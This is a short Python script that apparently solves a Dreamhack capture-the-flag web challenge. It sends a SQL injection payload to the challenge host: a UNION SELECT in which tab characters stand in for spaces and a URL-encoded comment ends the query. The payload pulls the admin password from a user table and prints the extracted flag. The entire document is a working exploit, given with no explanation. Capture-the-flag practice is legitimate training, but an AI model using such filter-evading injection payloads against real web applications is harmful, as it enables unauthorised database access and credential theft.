import requests
url = "http://host3.dreamhack.games:16381/"
flag = "D"
payload = f"{url}?uid=%27Union%09Select%09NULL,upw,NULL%09From%09user%09Where%09uid='Admin'%23"
res = requests.get(payload)

flag += res.text.split("D")[-1].split("}")[0]
flag += "}"
print(flag)
